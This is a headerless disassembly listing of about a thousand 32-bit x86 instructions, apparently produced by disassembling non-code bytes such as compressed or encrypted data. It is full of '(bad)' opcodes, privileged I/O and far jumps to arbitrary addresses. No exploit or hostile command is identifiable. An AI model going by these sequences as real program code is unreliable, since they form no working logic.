  44fc5c:	mov    bh,0xa6
  44fc5e:	jmp    0x4ffe1302
  44fc63:	push   es
  44fc64:	dec    edi
  44fc65:	adc    al,bh
  44fc67:	xor    dl,BYTE PTR [esi-0x7f61a45e]
  44fc6d:	xchg   BYTE PTR [ebx],ch
  44fc6f:	pop    es
  44fc70:	leave  
  44fc71:	(bad)  
  44fc72:	pusha  
  44fc73:	dec    esp
  44fc74:	push   0xffffffcf
  44fc76:	mov    esi,0x20f559c4
  44fc7b:	inc    eax
  44fc7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44fc7d:	dec    ecx
  44fc7e:	and    ch,bl
  44fc80:	aas    
  44fc81:	pop    ebp
  44fc82:	and    eax,DWORD PTR [ebx+0x1b]
  44fc85:	cdq    
  44fc86:	dec    edi
  44fc87:	mov    ebx,0xf1cd1a51
  44fc8c:	int    0xd0
  44fc8e:	sub    ecx,DWORD PTR [ebp+0x7d65d8df]
  44fc94:	sahf   
  44fc95:	inc    esi
  44fc96:	jg     0x44fcd8
  44fc98:	sar    DWORD PTR [eax],0xbf
  44fc9b:	xchg   ebp,eax
  44fc9c:	push   0xc154ce80
  44fca1:	push   es
  44fca2:	repnz shl DWORD PTR [edx],cl
  44fca5:	pushf  
  44fca6:	mov    ebx,0xda94c101
  44fcab:	call   0x5591e625
  44fcb0:	push   ebx
  44fcb1:	xchg   BYTE PTR [eax-0x7d7b1adc],dh
  44fcb7:	std    
  44fcb8:	sar    DWORD PTR es:[edx+0xb091bdc],0xae
  44fcc0:	jg     0x44fd0e
  44fcc2:	sub    al,BYTE PTR [ebx]
  44fcc4:	push   edi
  44fcc5:	(bad)  
  44fcc6:	mov    cl,0xf4
  44fcc8:	int    0xd8
  44fcca:	cmp    BYTE PTR [ecx+0x55],ch
  44fccd:	call   0x3cf:0x4692f2fc
  44fcd4:	add    al,0x7a
  44fcd6:	xchg   esi,eax
  44fcd7:	sbb    DWORD PTR [esp+ebx*4],ebp
  44fcda:	pop    ss
  44fcdb:	ins    BYTE PTR es:[edi],dx
  44fcdc:	push   cs
  44fcdd:	lahf   
  44fcde:	add    al,0x98
  44fce0:	gs or  eax,0xd643f2ab
  44fce6:	outs   dx,BYTE PTR ds:[esi]
  44fce7:	mov    edx,0xd0c0a8e5
  44fcec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44fced:	inc    edi
  44fcee:	mov    bh,0x14
  44fcf0:	xchg   BYTE PTR [ebx],bl
  44fcf2:	push   edx
  44fcf3:	pop    ds
  44fcf4:	aad    0x77
  44fcf6:	aas    
  44fcf7:	out    0x9c,eax
  44fcf9:	xor    bl,BYTE PTR [esi+0x2bf92b7b]
  44fcff:	mov    ds:0x2d2fd0cc,al
  44fd04:	sbb    DWORD PTR [ebx],ecx
  44fd06:	adc    DWORD PTR [ebx+0x5],edx
  44fd09:	lds    ecx,FWORD PTR [eax+0x351208eb]
  44fd0f:	xchg   edi,eax
  44fd10:	popf   
  44fd11:	hlt    
  44fd12:	mul    BYTE PTR [edx]
  44fd14:	or     bh,BYTE PTR [eax-0x48]
  44fd17:	inc    esp
  44fd18:	hlt    
  44fd19:	mov    ds:0x21357b20,al
  44fd1e:	iret   
  44fd1f:	icebp  
  44fd20:	jae    0x44fd91
  44fd22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44fd23:	adc    al,0xd0
  44fd25:	sub    al,0x46
  44fd27:	dec    ecx
  44fd28:	adc    eax,0x3af435af
  44fd2d:	leave  
  44fd2e:	shufps xmm6,XMMWORD PTR [esi+0x49],0x3a
  44fd33:	sbb    esi,DWORD PTR [esi-0x24677940]
  44fd39:	aad    0x3b
  44fd3b:	and    al,0x6f
  44fd3d:	jle    0x44fcf7
  44fd3f:	mov    ah,0xd0
  44fd41:	pop    ebp
  44fd42:	test   DWORD PTR [esi+0x7c6c3356],eax
  44fd48:	pop    ds
  44fd49:	cdq    
  44fd4a:	cmp    DWORD PTR [edi],eax
  44fd4c:	sbb    bh,BYTE PTR [eax]
  44fd4e:	dec    edi
  44fd4f:	outs   dx,DWORD PTR ds:[esi]
  44fd50:	pop    ebx
  44fd51:	fsubr  DWORD PTR [ecx]
  44fd53:	adc    eax,0xfe0cb324
  44fd58:	push   es
  44fd59:	imul   edi,edi,0xafa21277
  44fd5f:	jb     0x44fd80
  44fd61:	mov    edi,0x72ebef0f
  44fd66:	out    dx,al
  44fd67:	or     eax,0x9502bda0
  44fd6c:	add    DWORD PTR [esi+eax*2+0x1c591709],esp
  44fd73:	jmp    0xbbe6211d
  44fd78:	xchg   edx,eax
  44fd79:	jp     0x44fda8
  44fd7b:	aam    0x5d
  44fd7d:	iret   
  44fd7e:	shrd   DWORD PTR [esi-0x1c],ecx,cl
  44fd82:	sbb    DWORD PTR [ecx-0xc],ebx
  44fd85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44fd86:	xor    DWORD PTR [ebp+0x36],ebp
  44fd89:	cmp    edi,DWORD PTR [ebx-0x2ab0280c]
  44fd8f:	xchg   ebp,eax
  44fd90:	gs dec esi
  44fd92:	or     al,0xed
  44fd94:	in     eax,0x8e
  44fd96:	jge    0x44fdc4
  44fd98:	push   ss
  44fd99:	cmp    DWORD PTR [edi+0x1b02e7c8],ebp
  44fd9f:	inc    eax
  44fda0:	pop    edi
  44fda1:	lahf   
  44fda2:	sub    esp,DWORD PTR [esi]
  44fda4:	hlt    
  44fda5:	add    al,0xe9
  44fda7:	inc    ecx
  44fda8:	sub    DWORD PTR [esi],esp
  44fdaa:	xchg   esi,eax
  44fdab:	ja     0x44fd8b
  44fdad:	and    edi,DWORD PTR [edx+0x7ad903a4]
  44fdb3:	mov    ebx,0xe52f5e75
  44fdb8:	lods   eax,DWORD PTR ds:[esi]
  44fdb9:	jo     0x44fd9a
  44fdbb:	mov    ecx,0x5d9e7923
  44fdc0:	popa   
  44fdc1:	ror    BYTE PTR [edi-0x5d],1
  44fdc4:	leave  
  44fdc5:	call   0x7208:0x29bcc69b
  44fdcc:	retf   0x8951
  44fdcf:	out    0x77,al
  44fdd1:	lahf   
  44fdd2:	mov    ebx,eax
  44fdd4:	fbld   TBYTE PTR [ecx-0x37]
  44fdd7:	(bad)  
  44fdd8:	fstp   QWORD PTR [ecx]
  44fdda:	inc    ebp
  44fddb:	inc    ebp
  44fddc:	sbb    al,BYTE PTR gs:0x95c0b5ed
  44fde3:	adc    BYTE PTR ds:0x51866469,ah
  44fde9:	push   0x50
  44fdeb:	cmp    eax,0xdf8b9b00
  44fdf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44fdf1:	fadd   DWORD PTR [esi]
  44fdf3:	mov    edi,0xbf286c59
  44fdf8:	and    edi,DWORD PTR [ecx-0x3c609c65]
  44fdfe:	pop    ds
  44fdff:	inc    esi
  44fe00:	add    esi,DWORD PTR [ecx-0x32014405]
  44fe06:	mov    ebp,0x719af950
  44fe0b:	xor    bl,BYTE PTR [ebx]
  44fe0d:	dec    ecx
  44fe0e:	call   DWORD PTR [eax]
  44fe10:	sar    BYTE PTR [eax],0xcb
  44fe13:	scas   eax,DWORD PTR es:[edi]
  44fe14:	mov    ?,WORD PTR [ebx]
  44fe16:	(bad)  
  44fe18:	sar    ch,1
  44fe1a:	clc    
  44fe1b:	leave  
  44fe1c:	and    edi,DWORD PTR [eax+edi*4-0x49a7ba84]
  44fe23:	ss nop
  44fe25:	scas   eax,DWORD PTR es:[edi]
  44fe26:	out    dx,eax
  44fe27:	hlt    
  44fe28:	mov    dl,0x9f
  44fe2a:	cwde   
  44fe2b:	cmp    eax,esi
  44fe2d:	test   ebp,edi
  44fe2f:	ja     0x44fe85
  44fe31:	mov    ebp,0xf1e0f26b
  44fe36:	add    al,0x5
  44fe38:	fstp   QWORD PTR [edi+0x302ef0b5]
  44fe3e:	mov    ch,0x6f
  44fe40:	or     al,0x29
  44fe42:	into   
  44fe43:	xchg   esp,eax
  44fe44:	cmp    eax,0xacc5bd28
  44fe49:	mov    eax,0x4678613b
  44fe4e:	mov    dh,0x39
  44fe50:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44fe52:	inc    edx
  44fe53:	icebp  
  44fe54:	mov    ds:0x3c0bc724,al
  44fe59:	mov    eax,ds:0x965d04b6
  44fe5e:	jns    0x44fe39
  44fe60:	test   DWORD PTR [edi+0x80cf8e5],esp
  44fe66:	in     al,0xf5
  44fe68:	aam    0x30
  44fe6a:	clc    
  44fe6b:	and    DWORD PTR fs:[ecx],ebp
  44fe6e:	sahf   
  44fe6f:	ins    BYTE PTR es:[edi],dx
  44fe70:	or     bl,BYTE PTR [edi]
  44fe72:	(bad)  
  44fe73:	shr    BYTE PTR [edi],1
  44fe75:	sahf   
  44fe76:	mov    ebx,0x9094e380
  44fe7b:	mov    edi,0xff6bb1b7
  44fe81:	mov    DWORD PTR [eax+0x1d53e3a4],edi
  44fe87:	ret    
  44fe88:	in     eax,dx
  44fe89:	mov    ds:0x6568cbeb,al
  44fe8e:	stc    
  44fe8f:	jbe    0x44fe36
  44fe91:	and    cl,BYTE PTR [ecx+0x16]
  44fe94:	xchg   esi,eax
  44fe95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44fe96:	arpl   bp,si
  44fe98:	xchg   esi,eax
  44fe99:	into   
  44fe9a:	rcr    edi,cl
  44fe9c:	dec    esi
  44fe9d:	lahf   
  44fe9e:	inc    esp
  44fe9f:	ret    
  44fea0:	xor    eax,0x65d70d78
  44fea5:	xchg   edi,eax
  44fea6:	cmovo  edx,ebx
  44fea9:	sar    DWORD PTR [ebp-0x583173e4],cl
  44feaf:	lea    ebx,[eax+ebp*1+0x3778f716]
  44feb6:	in     eax,0x94
  44feb8:	push   ds
  44feb9:	rol    DWORD PTR ds:0x7bab4e43,1
  44febf:	sub    bl,BYTE PTR [esi-0x7c]
  44fec2:	inc    ecx
  44fec3:	in     eax,dx
  44fec4:	and    DWORD PTR ds:0xad136d9b,0x3d9ddb8d
  44fece:	mov    ch,ch
  44fed0:	mov    dh,0x9e
  44fed2:	inc    ebp
  44fed3:	test   eax,0x910aa465
  44fed8:	jmp    0x354a:0x25f0a5f3
  44fedf:	lock arpl dx,bp
  44fee2:	loop   0x44fecd
  44fee4:	add    ebx,DWORD PTR [edx]
  44fee6:	and    al,0xc8
  44fee8:	xor    ah,BYTE PTR [ebx-0x1917fce7]
  44feee:	adc    edi,DWORD PTR [edi-0x2b]
  44fef1:	xor    ebx,esp
  44fef3:	in     eax,dx
  44fef4:	push   edi
  44fef5:	test   BYTE PTR [edi],ch
  44fef7:	xchg   edi,eax
  44fef8:	push   edx
  44fef9:	imul   ecx,edi,0xaae7a1c1
  44feff:	mov    esp,0x72779a80
  44ff04:	imul   dl
  44ff06:	das    
  44ff07:	arpl   WORD PTR [ecx],si
  44ff09:	mov    esp,0x1f3f4fff
  44ff0e:	add    ebp,DWORD PTR [esi+0x7d]
  44ff11:	pop    edi
  44ff12:	retf   0x1f50
  44ff15:	fldcw  WORD PTR [ecx+ebp*1-0x53]
  44ff19:	nop
  44ff1a:	mov    ds:0x3bb85385,eax
  44ff1f:	popa   
  44ff20:	sub    ch,BYTE PTR [edi+0x65]
  44ff23:	cmp    BYTE PTR [ecx+0x59],ah
  44ff26:	mov    dh,ch
  44ff28:	sbb    ecx,ebp
  44ff2a:	in     al,dx
  44ff2b:	push   edi
  44ff2c:	add    dh,bl
  44ff2e:	push   ebx
  44ff2f:	cmc    
  44ff30:	mov    edi,0x11f1fbac
  44ff35:	or     eax,0x9030442c
  44ff3a:	imul   ebp,DWORD PTR [eax+0x61],0x1ff2a0b2
  44ff41:	jns    0x44ff5f
  44ff43:	mov    bh,0xc5
  44ff45:	in     eax,0xf0
  44ff47:	ret    0x9f06
  44ff4a:	sub    ch,BYTE PTR [ebp-0x1abac7bb]
  44ff50:	pusha  
  44ff51:	inc    ebp
  44ff52:	(bad)  
  44ff53:	push   ebp
  44ff54:	sbb    DWORD PTR [ecx],ecx
  44ff56:	repz or bl,BYTE PTR [edx+0x0]
  44ff5a:	ret    0x93e
  44ff5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ff5e:	or     edi,DWORD PTR [edi]
  44ff60:	adc    edi,DWORD PTR ds:0x56a0f895
  44ff66:	in     al,dx
  44ff67:	xchg   esp,eax
  44ff68:	dec    eax
  44ff69:	mov    ecx,0xf13ea33a
  44ff6e:	scas   al,BYTE PTR es:[edi]
  44ff6f:	sub    cl,dh
  44ff71:	dec    esp
  44ff72:	sti    
  44ff73:	in     eax,dx
  44ff74:	sub    eax,0x1b4b1f4a
  44ff79:	inc    ecx
  44ff7a:	call   0xd9f7cc1c
  44ff7f:	lea    edx,[esi]
  44ff81:	test   eax,0x12f4d4de
  44ff86:	(bad)  
  44ff87:	pop    ecx
  44ff88:	mov    DWORD PTR [ebp+0x1b],ebx
  44ff8b:	mov    edi,0xf16761bc
  44ff91:	pop    ds
  44ff92:	pop    esi
  44ff93:	iret   
  44ff94:	aaa    
  44ff95:	out    dx,al
  44ff96:	mov    bl,0x24
  44ff98:	and    BYTE PTR [ebp+eiz*1+0x7ba3ff5d],0x72
  44ffa0:	inc    edx
  44ffa1:	adc    al,0x3
  44ffa3:	(bad)  
  44ffa4:	in     eax,0x91
  44ffa6:	ret    0x9f5c
  44ffa9:	push   eax
  44ffaa:	mov    ecx,0xeb9d904
  44ffaf:	jno    0x44ffb7
  44ffb1:	sub    eax,0x95215dc6
  44ffb6:	mov    cs,ecx
  44ffb8:	jns    0x44ff5f
  44ffba:	mov    edx,0x685a1294
  44ffbf:	add    bh,BYTE PTR [edi+ebx*4]
  44ffc2:	cmp    ebx,DWORD PTR [eax]
  44ffc4:	ja     0x450035
  44ffc6:	jnp    0x44ff97
  44ffc8:	addr16 inc ecx
  44ffca:	cmp    bh,dl
  44ffcc:	and    DWORD PTR [edi+0x2ed4e6d0],ebp
  44ffd2:	push   0xffffffa8
  44ffd4:	pop    edi
  44ffd5:	or     al,0xf6
  44ffd7:	in     al,0x20
  44ffd9:	aad    0x8b
  44ffdb:	mov    ebp,0x47bc8a02
  44ffe0:	dec    ebp
  44ffe1:	xor    al,0x5b
  44ffe3:	lods   eax,DWORD PTR ds:[esi]
  44ffe4:	xchg   BYTE PTR ds:0xc6366422,dh
  44ffea:	(bad)  
  44ffeb:	lock inc edi
  44ffed:	cdq    
  44ffee:	dec    esi
  44ffef:	sub    eax,0x91a163cb
  44fff4:	ret    0x7c29
  44fff7:	je     0x44ffd4
  44fff9:	mov    WORD PTR [ebp+0x6b],ds
  44fffc:	sub    DWORD PTR [ecx-0x46],ecx
  44ffff:	in     al,0x5f
  450001:	(bad)  
  450002:	ds aas 
  450004:	and    BYTE PTR [esi],bh
  450006:	sub    DWORD PTR [ebp+0x4f9b5120],esp
  45000c:	bound  esp,QWORD PTR [eax+0x39c35aeb]
  450012:	mov    cl,0x1f
  450014:	push   cs
  450015:	jae    0x44ffd4
  450017:	fdivr  DWORD PTR [ecx]
  450019:	jmp    0x4fd4a4dc
  45001e:	retf   0x95bf
  450021:	imul   edx,DWORD PTR [ebx-0x13],0xffffffe7
  450025:	outs   dx,DWORD PTR ds:[esi]
  450026:	sub    dh,dl
  450028:	and    bl,BYTE PTR [ecx+0x161db072]
  45002e:	aaa    
  45002f:	sub    DWORD PTR [edx-0x53],eax
  450032:	fwait
  450033:	jns    0x450080
  450035:	(bad)  
  450036:	jmp    0x2dea20cd
  45003b:	xchg   edx,eax
  45003c:	mov    cl,0xc9
  45003e:	movaps xmm4,XMMWORD PTR [eax]
  450041:	mov    eax,ds:0xaffa306b
  450046:	mov    ds:0x5cfe05d2,al
  45004b:	jmp    0x450085
  45004d:	test   al,0xf5
  45004f:	mov    WORD PTR [ebx],fs
  450051:	leave  
  450052:	or     BYTE PTR [ecx-0x32],0xb6
  450056:	and    eax,0x3ba1e04d
  45005b:	out    0x71,eax
  45005d:	sub    BYTE PTR [ebp-0x39],dh
  450060:	sti    
  450061:	stc    
  450062:	test   eax,0xed62293b
  450067:	mov    ah,0xcb
  450069:	sbb    al,0x94
  45006b:	xchg   BYTE PTR [edx],al
  45006d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  45006e:	push   esi
  45006f:	ffreep st(6)
  450071:	je     0x4500b6
  450073:	jecxz  0x45009a
  450075:	mov    bl,0x48
  450077:	les    edx,FWORD PTR [ecx-0x46b094b1]
  45007d:	adc    DWORD PTR [ecx-0x373e2c5c],esi
  450083:	xor    dh,BYTE PTR [ebp-0x49]
  450086:	pop    esp
  450087:	out    dx,al
  450088:	mov    edi,0x1ddbfb30
  45008d:	imul   eax,ebx,0x8eb407e0
  450093:	call   0xdfe0:0x891ba249
  45009a:	inc    ebp
  45009b:	(bad)  
  45009c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  45009d:	mov    ebx,esp
  45009f:	inc    esp
  4500a0:	in     eax,dx
  4500a1:	add    esp,DWORD PTR [edi-0x44f6a62a]
  4500a7:	pop    esp
  4500a8:	sbb    DWORD PTR [ecx-0xfae92d5],0x768b27d8
  4500b2:	inc    eax
  4500b3:	mov    dl,0xa0
  4500b5:	cmpxchg BYTE PTR [esi+edx*4-0x5a6ce68d],al
  4500bd:	pop    edx
  4500be:	mov    dl,0xe8
  4500c0:	(bad)  
  4500c1:	mov    edi,0x3aef3453
  4500c6:	pop    edx
  4500c7:	pop    ecx
  4500c8:	and    BYTE PTR [ebp-0x1166dc1],al
  4500ce:	cdq    
  4500cf:	sbb    ah,ch
  4500d1:	pop    edx
  4500d2:	sbb    dh,ah
  4500d4:	pusha  
  4500d5:	mov    dh,BYTE PTR [edi-0x1a]
  4500d8:	sub    BYTE PTR [ecx+0x73b87cf9],ch
  4500de:	imul   edi,esp,0xffffff9f
  4500e1:	lock add al,0x8e
  4500e5:	sti    
  4500e6:	mov    ebp,0x32d502b4
  4500eb:	push   ebp
  4500ec:	fs (bad) 
  4500ee:	mov    edx,0xc7424ac4
  4500f3:	loop   0x45014a
  4500f5:	dec    ebp
  4500f6:	xchg   esp,eax
  4500f7:	repnz xchg edx,eax
  4500f9:	sbb    ecx,DWORD PTR [ecx]
  4500fb:	in     al,dx
  4500fc:	adc    eax,0xa0fbd419
  450101:	xchg   edx,eax
  450102:	cli    
  450103:	inc    esp
  450104:	sbb    BYTE PTR [esi-0x7bd4bae5],0x19
  45010b:	test   BYTE PTR [esi],bl
  45010d:	push   es
  45010e:	dec    edx
  45010f:	dec    eax
  450110:	mov    bh,0x9a
  450112:	mov    bl,0x14
  450114:	repnz les esi,FWORD PTR [edi+ecx*8-0x151443bb]
  45011c:	nop
  45011d:	retf   
  45011e:	jmp    0x450173
  450120:	sbb    eax,0xa9f6d749
  450125:	or     al,0x5a
  450127:	cmc    
  450128:	and    BYTE PTR [esi-0x3dfdf644],dl
  45012e:	in     al,0x77
  450130:	ds pop edx
  450132:	mov    ebx,0x727b0ef0
  450137:	push   0x2f2be91f
  45013c:	mov    esp,DWORD PTR [ecx]
  45013e:	loop   0x4501b6
  450140:	jns    0x450161
  450142:	loopne 0x4501bb
  450144:	pop    esi
  450145:	test   BYTE PTR [eax-0x39a54bc4],dh
  45014b:	fcomp  QWORD PTR [ebx]
  45014d:	das    
  45014e:	mov    esi,0x729cdd4
  450153:	call   0x97e3b841
  450158:	in     al,0xdd
  45015a:	mov    eax,0x870e0844
  45015f:	sub    BYTE PTR [edx+ebx*8-0x8e19b4c],dh
  450166:	mov    ds:0xbe7ed25,eax
  45016b:	cmp    DWORD PTR [esi],edx
  45016d:	mov    eax,0x361c810
  450172:	leave  
  450173:	jmp    0x301e:0x5444f81a
  45017a:	leave  
  45017b:	aam    0x99
  45017d:	inc    eax
  45017e:	and    al,0x29
  450180:	fadd   QWORD PTR [edi]
  450182:	mov    cl,0x2c
  450184:	xchg   BYTE PTR ds:0x3cd92c14,dl
  45018a:	mov    eax,0x97f5a9b4
  45018f:	cli    
  450190:	xchg   ebp,eax
  450191:	cmp    ebx,DWORD PTR [ecx]
  450193:	icebp  
  450194:	xchg   esi,eax
  450195:	bound  ebx,QWORD PTR [ebx]
  450197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450198:	and    al,0xb9
  45019a:	adc    al,0x12
  45019c:	add    BYTE PTR [ebp+0xb],cl
  45019f:	jge    0x45012e
  4501a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4501a2:	fwait
  4501a3:	jl     0x450200
  4501a5:	mov    ch,0x34
  4501a8:	xor    bl,ah
  4501aa:	or     edx,DWORD PTR [ebp+0x23]
  4501ad:	sbb    BYTE PTR [ebx-0x70e1eec],dh
  4501b3:	mov    al,0x16
  4501b5:	fneni(8087 only) 
  4501b7:	popf   
  4501b8:	sbb    eax,0x6344ed79
  4501bd:	ret    0x9372
  4501c0:	mov    eax,0x3ec4b763
  4501c5:	arpl   si,ax
  4501c7:	loope  0x45022e
  4501c9:	lea    edi,[ebp-0xf]
  4501cc:	into   
  4501cd:	cmc    
  4501ce:	xor    al,0xb4
  4501d0:	pop    ss
  4501d1:	cdq    
  4501d2:	and    bx,WORD PTR [eax+0x7ffa3f66]
  4501d9:	jge    0x4501d7
  4501db:	mov    ds:0x2ed30703,eax
  4501e0:	pandn  mm1,mm3
  4501e3:	mov    ah,0x52
  4501e5:	popa   
  4501e6:	daa    
  4501e7:	outs   dx,DWORD PTR ds:[esi]
  4501e8:	adc    ecx,edx
  4501ea:	mov    al,0x84
  4501ec:	sbb    al,0x8c
  4501ee:	mov    ah,0x1f
  4501f0:	mov    ch,0x33
  4501f2:	mov    dl,0xed
  4501f4:	dec    eax
  4501f5:	or     WORD PTR [ebx*1+0x48cb5599],0x90b0
  4501ff:	and    DWORD PTR [eax+0x1a11cd8a],esi
  450205:	or     al,0xb8
  450207:	jge    0x4501b2
  450209:	mov    esi,DWORD PTR [ebx-0x314aba75]
  45020f:	and    dh,BYTE PTR cs:[ebx+0x6922a3c0]
  450216:	mov    esi,ebp
  450218:	add    DWORD PTR [edx-0x66],esi
  45021b:	js     0x4501d1
  45021d:	sar    BYTE PTR [ebx+0x2c57ae70],cl
  450223:	sub    DWORD PTR [eax],esp
  450225:	adc    ah,BYTE PTR [esi+eax*4+0x3]
  450229:	sti    
  45022a:	push   esi
  45022b:	pop    esi
  45022c:	sbb    ch,BYTE PTR [ebp+0x68ee69de]
  450232:	ja     0x4502b3
  450234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450235:	call   0xf021:0x332b6b
  45023c:	sbb    bl,BYTE PTR [ebx+0x5a]
  45023f:	loopne 0x450258
  450241:	das    
  450242:	mov    dl,BYTE PTR [esi+0x26]
  450245:	imul   esi,DWORD PTR [ebx+0x6c2b4988],0xd93ff9ed
  45024f:	test   al,0x1b
  450251:	mov    ecx,0xff9513b4
  450256:	pop    ss
  450257:	and    BYTE PTR [bp+di-0x46d5],dh
  45025c:	push   eax
  45025d:	icebp  
  45025e:	es nop
  450260:	sbb    DWORD PTR [ebx+edi*2-0x24],0x768de91d
  450268:	xor    BYTE PTR [esi],bh
  45026a:	xchg   edi,eax
  45026b:	retf   0x9be3
  45026e:	jnp    0x4501f1
  450270:	pop    ecx
  450271:	mov    ecx,0x7cff0d81
  450276:	rcl    cl,1
  450278:	rcr    esi,0xb2
  45027b:	xor    al,0xd0
  45027d:	ss jmp 0x2c1a0865
  450283:	repz mov dl,0x3b
  450286:	push   cs
  450287:	hlt    
  450288:	ret    0x5cac
  45028b:	ret    
  45028c:	add    eax,0x3ef07d98
  450291:	mov    edi,0x42554179
  450296:	inc    edx
  450297:	in     eax,dx
  450298:	mov    dl,0xbf
  45029a:	lahf   
  45029b:	sub    ah,BYTE PTR [edx]
  45029d:	cmp    DWORD PTR [edx+ebx*4-0x6d],edi
  4502a1:	pushf  
  4502a2:	cld    
  4502a3:	inc    ebp
  4502a4:	stos   DWORD PTR es:[edi],eax
  4502a5:	test   BYTE PTR [edx+edi*8],bl
  4502a8:	(bad)  
  4502a9:	sbb    BYTE PTR [ebx+0xd],ah
  4502ac:	fistp  WORD PTR [esi]
  4502ae:	mov    eax,0xed092448
  4502b3:	or     edx,eax
  4502b5:	dec    ebp
  4502b6:	arpl   bp,dx
  4502b8:	pop    es
  4502b9:	test   al,0xfb
  4502bb:	push   ss
  4502bc:	sub    eax,0x31c7d42d
  4502c1:	mov    eax,ds:0xd955b2
  4502c6:	mov    ch,0xa4
  4502c8:	das    
  4502c9:	or     ebp,DWORD PTR [esi]
  4502cb:	shl    DWORD PTR [ebp-0x1417fea9],0x8b
  4502d2:	cmp    ebx,DWORD PTR [edx]
  4502d4:	and    bh,BYTE PTR [ecx-0x12bf58ab]
  4502da:	retf   0x109d
  4502dd:	pushf  
  4502de:	dec    ebx
  4502df:	cmp    eax,0x533acaeb
  4502e4:	inc    esp
  4502e5:	lods   al,BYTE PTR ds:[esi]
  4502e6:	imul   ecx,DWORD PTR [edx+ebx*1],0x5c44b800
  4502ed:	adc    edi,DWORD PTR [esi-0x70c00aeb]
  4502f3:	call   0xacd9cfdb
  4502f8:	sbb    bh,BYTE PTR [ecx]
  4502fa:	jae    0x45037a
  4502fc:	(bad)  
  4502fd:	rol    ch,cl
  4502ff:	retf   0x152f
  450302:	cld    
  450303:	sub    eax,esi
  450305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450306:	ins    DWORD PTR es:[edi],dx
  450307:	cmp    eax,DWORD PTR [ebp+0x51]
  45030a:	mov    edi,0xfc935ed
  45030f:	push   esi
  450310:	retf   
  450311:	fs inc esp
  450313:	xchg   esi,eax
  450314:	and    DWORD PTR [esi-0x651ac339],edx
  45031a:	sti    
  45031b:	add    eax,0xd3a0532a
  450320:	in     al,0x1b
  450322:	push   cs
  450323:	sub    eax,0x74b3205c
  450328:	mov    dl,0x81
  45032a:	pop    edi
  45032b:	jnp    0x4502f2
  45032d:	out    0x9a,al
  45032f:	bnd je 0x45032d
  450332:	sbb    al,0xd8
  450334:	jg     0x450360
  450336:	xchg   ebp,eax
  450337:	sub    DWORD PTR ds:0xd9034de9,ebx
  45033d:	mov    esp,0xa98523b4
  450342:	data16 cmc 
  450344:	loope  0x4502d1
  450346:	shr    BYTE PTR [ebx],1
  450348:	test   BYTE PTR [edi],cl
  45034a:	xchg   esp,eax
  45034b:	addr16 je 0x4503b3
  45034e:	mov    cl,0x74
  450350:	cli    
  450351:	push   es
  450352:	(bad)
  450355:	js     0x4502eb
  450357:	(bad)  
  450358:	outs   dx,DWORD PTR ds:[esi]
  450359:	and    dl,BYTE PTR [eax]
  45035b:	ins    DWORD PTR es:[edi],dx
  45035c:	repz add esp,ebx
  45035f:	mov    al,0xae
  450361:	adc    edi,DWORD PTR [eax-0x53b4421c]
  450367:	jmp    0x7a8ba132
  45036c:	push   ss
  45036d:	jno    0x4503e5
  45036f:	dec    esi
  450370:	pop    ss
  450371:	mov    ?,WORD PTR [edi-0x3c9806be]
  450377:	les    esi,FWORD PTR [edi-0x74dffde0]
  45037d:	mov    ah,0xfb
  45037f:	inc    edx
  450380:	repz (bad) 
  450382:	xor    al,0x12
  450384:	inc    ebp
  450385:	mov    ds:0x231ac75e,eax
  45038a:	sbb    bl,BYTE PTR [edi+0x22]
  45038d:	cmp    esp,esi
  45038f:	xor    dl,0x6c
  450392:	push   0xf
  450394:	push   0xffffffd3
  450396:	sub    ecx,esp
  450398:	cmp    al,0x81
  45039a:	fwait
  45039b:	mov    al,ds:0xa534021d
  4503a0:	sbb    eax,0x2ff10b69
  4503a5:	loopne 0x450344
  4503a7:	repnz fmulp st(5),st
  4503aa:	sub    al,0x1a
  4503ac:	dec    edx
  4503ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4503ae:	or     ebx,ebx
  4503b0:	dec    eax
  4503b1:	or     edi,eax
  4503b3:	inc    edi
  4503b4:	push   ds
  4503b5:	jns    0x45039d
  4503b7:	dec    ebx
  4503b8:	ja     0x45039d
  4503ba:	and    edi,ecx
  4503bc:	and    BYTE PTR [eax-0x68fb7c55],ch
  4503c2:	mov    gs,WORD PTR [edx]
  4503c4:	adc    DWORD PTR [edi+0x3e],eax
  4503c7:	push   es
  4503c8:	sbb    BYTE PTR [esp+esi*4],cl
  4503cb:	xchg   esp,eax
  4503cc:	inc    ecx
  4503cd:	dec    edi
  4503ce:	mov    eax,ds:0xc2db68fa
  4503d3:	sub    al,0x19
  4503d5:	loope  0x450422
  4503d7:	mov    ds:0xa0ff6942,eax
  4503dc:	sbb    al,0x29
  4503de:	enter  0x1aef,0xb3
  4503e2:	mov    dl,BYTE PTR [eax+0x31]
  4503e5:	mov    al,ds:0x7a1742cb
  4503ea:	or     DWORD PTR [edx],0xd9eec22d
  4503f0:	mov    DWORD PTR [ecx],esp
  4503f2:	mov    cl,0x24
  4503f4:	les    edi,FWORD PTR [ebx]
  4503f6:	adc    al,BYTE PTR [eax-0x11c0366b]
  4503fc:	xchg   ecx,eax
  4503fd:	or     dh,BYTE PTR [esi]
  4503ff:	pop    esp
  450400:	scas   al,BYTE PTR es:[edi]
  450401:	jns    0x450420
  450403:	sbb    DWORD PTR [ecx-0x27ce9c61],eax
  450409:	aas    
  45040a:	xchg   edx,eax
  45040b:	scas   eax,DWORD PTR es:[edi]
  45040c:	and    eax,0xd3f26682
  450411:	aam    0x41
  450413:	(bad)  
  450414:	cli    
  450415:	nop
  450416:	adc    al,0xc4
  450418:	bound  edx,QWORD PTR [ebp-0x1f]
  45041b:	test   al,dl
  45041d:	lahf   
  45041e:	hlt    
  45041f:	or     DWORD PTR [esi+0x59],esp
  450422:	cmp    eax,0xa79c77a0
